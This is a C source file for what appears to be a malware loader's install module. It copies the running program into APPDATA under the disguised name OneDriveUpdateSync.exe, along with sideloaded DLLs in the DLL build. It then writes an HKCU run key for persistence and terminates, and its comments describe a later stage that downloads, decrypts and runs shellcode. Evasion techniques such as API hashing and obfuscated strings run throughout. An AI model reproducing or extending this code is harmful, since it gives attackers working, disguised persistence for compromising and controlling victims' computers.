// =============================================
// Install.c  -  File copy + persistence install
//
// InstallAndContinue  (all EXE builds):
//   1. Detect if already persistence copy (basename == OneDriveUpdateSync.exe) → return
//      (caller continues to download → decrypt → shellcode)
//   2. GetEnvironmentVariableA("APPDATA") → build dest path
//   3. CreateDirectoryA for each intermediate level
//   4. CopyFileA self → OneDriveUpdateSync.exe
//   5. InstallPersistence → HKCU run-key
//   6. NtTerminateProcess(self) — OS fires run key at next logon
//
// SideloadInstallAndContinue  (all BUILD_DLL builds):
//   1. Detect if persistence reboot (/pf in command line) → return
//      (caller continues to download → decrypt → shellcode)
//   2. Build dest path + create dirs
//   3. CopyFileA host EXE → OneDriveUpdateSync.exe
//   4. CopyFileA *.dll → dest dir
//   5. InstallPersistence → HKCU run-key
//   6. NtTerminateProcess(self) — OS fires run key at next logon
// =============================================

#include "Common.h"

// ---- ASCII helpers (no CRT) ----
static SIZE_T Ins_ALen(const CHAR* s) { SIZE_T n = 0; while (s[n]) n++; return n; }
static VOID Ins_ACpy(CHAR* dst, const CHAR* src, SIZE_T max) {
    SIZE_T i; for (i = 0; i < max-1 && src[i]; i++) dst[i]=src[i]; dst[i]=0;
}
static VOID Ins_ACat(CHAR* dst, const CHAR* src, SIZE_T max) {
    SIZE_T n=Ins_ALen(dst), i;
    for (i = 0; i < max-n-1 && src[i]; i++) dst[n+i]=src[i];
    dst[n+i]=0;
}

// ---- Typedefs (all builds) ----
typedef DWORD    (WINAPI* fnGetEnvVarA)(LPCSTR, LPSTR, DWORD);
typedef BOOL     (WINAPI* fnCreateDirA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef BOOL     (WINAPI* fnCopyFileA3)(LPCSTR, LPCSTR, BOOL);
typedef DWORD    (WINAPI* fnGetModA)   (HMODULE, LPSTR, DWORD);
typedef NTSTATUS (NTAPI*  fnNtTerm2)  (HANDLE, NTSTATUS);

// Find* typedefs needed by SideloadInstallAndContinue (all sideload builds)
#ifdef BUILD_DLL
typedef LPCSTR (WINAPI* fnGetCmdLineA)(VOID);
typedef HANDLE (WINAPI* fnFindFirstA) (LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI* fnFindNextA)  (HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI* fnFindCloseA) (HANDLE);
#endif

// =============================================
// InstallAndContinue — all EXE builds
// =============================================
VOID InstallAndContinue(IN PAPI_HASHING pApi) {
    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pK32 || !pNtdll) return;

    BYTE xGetEnv[] = XSTR_GET_ENV_VAR_A;      DEOBF(xGetEnv);
    BYTE xMkDir[]  = XSTR_CREATE_DIRECTORY_A; DEOBF(xMkDir);
    BYTE xCpFile[] = XSTR_COPY_FILE_A;        DEOBF(xCpFile);
    fnGetEnvVarA   pGetEnv   = (fnGetEnvVarA)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xGetEnv);
    fnCreateDirA   pMkDir    = (fnCreateDirA)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xMkDir);
    fnCopyFileA3   pCpFile   = (fnCopyFileA3)  pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xCpFile);
    fnGetModA      pGetModA  = (fnGetModA)     FetchExportAddress(pK32,  GetModuleFileNameA_JOAAT);

    if (!pGetEnv || !pMkDir || !pCpFile || !pGetModA) {
        LOG("[!] Install: API resolution failed");
        return;
    }

    // 1. Get APPDATA
    CHAR szAppData[MAX_PATH] = {0};
    BYTE xAppData[] = XSTR_APPDATA_VAR; DEOBF(xAppData);
    if (!pGetEnv((LPCSTR)xAppData, szAppData, MAX_PATH)) {
        LOG("[!] Install: GetEnvironmentVariableA(APPDATA) failed");
        return;
    }

    // 2. Build dest dir
    CHAR szDestDir[MAX_PATH] = {0};
    Ins_ACpy(szDestDir, szAppData, MAX_PATH);
    {
        BYTE xSubDir[] = XSTR_INSTALL_SUBDIR; DEOBF(xSubDir);
        SIZE_T base = Ins_ALen(szDestDir);
        for (SIZE_T i = 0; xSubDir[i]; i++) {
            szDestDir[base + i]     = xSubDir[i];
            szDestDir[base + i + 1] = '\0';
            if (xSubDir[i] == '\\') pMkDir(szDestDir, NULL);
        }
    }
    LOG("[+] Install: directory tree ensured");

    // 3. Build dest EXE path (not used in this path but kept for self-guard)
    CHAR szDestExe[MAX_PATH] = {0};
    Ins_ACpy(szDestExe, szDestDir, MAX_PATH);
    BYTE xPName[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName);
    Ins_ACat(szDestExe, (CHAR*)xPName, MAX_PATH);

    // 4. Get source EXE path
    CHAR szSrcExe[MAX_PATH] = {0};
    if (!pGetModA(NULL, szSrcExe, MAX_PATH)) {
        LOG("[!] Install: GetModuleFileNameA failed");
        return;
    }

    // 5. Self-guard: if already the persistence copy,
    //    skip install and return to continue shellcode execution.
    {
        SIZE_T len = Ins_ALen(szSrcExe);
        SIZE_T lastSep = 0;
        for (SIZE_T i = 0; i < len; i++) if (szSrcExe[i] == '\\') lastSep = i;
        CHAR* szBase = szSrcExe + lastSep + 1;
        BYTE xPN2[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPN2);
        SIZE_T pi;
        for (pi = 0; xPN2[pi] && szBase[pi]; pi++) {
            CHAR a = xPN2[pi], b = szBase[pi];
            if (a >= 'A' && a <= 'Z') a += 32;
            if (b >= 'A' && b <= 'Z') b += 32;
            if (a != b) break;
        }
        if (!xPN2[pi] && !szBase[pi]) {
            LOG("[*] Install: already persistence copy, skipping");
            return;
        }
    }

    // 6. Copy EXE
    if (!pCpFile(szSrcExe, szDestExe, FALSE)) {
        LOG_HEX("[!] Install: CopyFileA failed, GLE=", GetLastError());
    } else {
        LOG("[+] Install: EXE copied to persistence path");
    }

    // 7. Write HKCU run key + terminate; OS fires the run key at next logon
    InstallPersistence(pApi);
    LOG("[+] Install: persistence registered, terminating");
    {
        fnNtTerm2 pNtTerm = (fnNtTerm2)FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
        if (pNtTerm) pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
    }
}

// =============================================
// SideloadInstallAndContinue — all BUILD_DLL builds
// =============================================
#ifdef BUILD_DLL

VOID SideloadInstallAndContinue(IN PAPI_HASHING pApi) {
    static WIN32_FIND_DATAA s_wfd;
    static CHAR  s_szSrcDll[MAX_PATH];
    static CHAR  s_szDstDll[MAX_PATH];
    static CHAR  s_szPattern[MAX_PATH];

    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pK32 || !pNtdll) return;

    BYTE xGetEnv[] = XSTR_GET_ENV_VAR_A;      DEOBF(xGetEnv);
    BYTE xMkDir[]  = XSTR_CREATE_DIRECTORY_A; DEOBF(xMkDir);
    BYTE xCpFile[] = XSTR_COPY_FILE_A;        DEOBF(xCpFile);

    fnGetEnvVarA  pGetEnv   = (fnGetEnvVarA) pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xGetEnv);
    fnCreateDirA  pMkDir    = (fnCreateDirA) pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xMkDir);
    fnCopyFileA3  pCpFile   = (fnCopyFileA3) pApi->pGetProcAddress((HMODULE)pK32, (LPCSTR)xCpFile);
    fnGetModA     pGetModA  = (fnGetModA)    FetchExportAddress(pK32,   GetModuleFileNameA_JOAAT);
    fnFindFirstA  pFFF      = (fnFindFirstA) FetchExportAddress(pK32,   FindFirstFileA_JOAAT);
    fnFindNextA   pFNF      = (fnFindNextA)  FetchExportAddress(pK32,   FindNextFileA_JOAAT);
    fnFindCloseA  pFC       = (fnFindCloseA) FetchExportAddress(pK32,   FindClose_JOAAT);
    fnNtTerm2     pNtTerm   = (fnNtTerm2)    FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
    fnGetCmdLineA pGetCmdA  = (fnGetCmdLineA)FetchExportAddress(pK32,   GetCommandLineA_JOAAT);

    if (!pGetEnv || !pMkDir || !pCpFile || !pGetModA || !pFFF || !pFNF || !pFC || !pNtTerm) {
        LOG("[!] SideloadInstall: API resolution failed");
        return;
    }

    // 1. Self-guard: detect persistence reboot via /pf in command line
    if (pGetCmdA) {
        LPCSTR szCmd = pGetCmdA();
        if (szCmd) {
            for (SIZE_T i = 0; szCmd[i]; i++) {
                if (szCmd[i] == '/' && szCmd[i+1] == 'p' && szCmd[i+2] == 'f') {
                    LOG("[*] SideloadInstall: persistence reboot (/pf), skipping");
                    return;
                }
            }
        }
    }

    // 2. APPDATA
    CHAR szAppData[MAX_PATH] = {0};
    BYTE xAppData[] = XSTR_APPDATA_VAR; DEOBF(xAppData);
    if (!pGetEnv((LPCSTR)xAppData, szAppData, MAX_PATH)) return;

    // 3. Build dest dir
    CHAR szDestDir[MAX_PATH] = {0};
    Ins_ACpy(szDestDir, szAppData, MAX_PATH);
    {
        BYTE xSubDir[] = XSTR_INSTALL_SUBDIR; DEOBF(xSubDir);
        SIZE_T base = Ins_ALen(szDestDir);
        for (SIZE_T i = 0; xSubDir[i]; i++) {
            szDestDir[base + i]     = xSubDir[i];
            szDestDir[base + i + 1] = '\0';
            if (xSubDir[i] == '\\') pMkDir(szDestDir, NULL);
        }
    }

    // 4. Get host EXE path + derive source dir
    CHAR szSrcExe[MAX_PATH] = {0};
    if (!pGetModA(NULL, szSrcExe, MAX_PATH)) return;

    SIZE_T exeLen = Ins_ALen(szSrcExe);
    SIZE_T lastSep = 0;
    for (SIZE_T i = 0; i < exeLen; i++) if (szSrcExe[i] == '\\') lastSep = i;
    CHAR szSrcDir[MAX_PATH] = {0};
    MemCopy(szSrcDir, szSrcExe, lastSep + 1);

    // 5. Build dest EXE path
    CHAR szDestExe[MAX_PATH] = {0};
    Ins_ACpy(szDestExe, szDestDir, MAX_PATH);
    BYTE xPName2[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPName2);
    Ins_ACat(szDestExe, (CHAR*)xPName2, MAX_PATH);

    // 6. Copy host EXE
    if (!pCpFile(szSrcExe, szDestExe, FALSE)) {
        LOG("[!] SideloadInstall: CopyFileA (EXE) failed");
    } else {
        LOG("[+] SideloadInstall: EXE copied");
    }

    // 7. Copy all *.dll from source dir
    Ins_ACpy(s_szPattern, szSrcDir, MAX_PATH);
    { const CHAR szGlob[] = {'*','.','d','l','l',0}; Ins_ACat(s_szPattern, szGlob, MAX_PATH); }
    MemSet(&s_wfd, 0, sizeof(s_wfd));
    HANDLE hFind = pFFF(s_szPattern, &s_wfd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(s_wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                Ins_ACpy(s_szSrcDll, szSrcDir, MAX_PATH);
                Ins_ACat(s_szSrcDll, s_wfd.cFileName, MAX_PATH);
                Ins_ACpy(s_szDstDll, szDestDir, MAX_PATH);
                Ins_ACat(s_szDstDll, s_wfd.cFileName, MAX_PATH);
                pCpFile(s_szSrcDll, s_szDstDll, FALSE);
            }
        } while (pFNF(hFind, &s_wfd));
        pFC(hFind);
        LOG("[+] SideloadInstall: DLLs copied");
    }

    // 8. Write HKCU run key + terminate; OS fires the run key at next logon
    InstallPersistence(pApi);
    LOG("[+] SideloadInstall: persistence registered, terminating");
    pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
}

#endif /* BUILD_DLL */
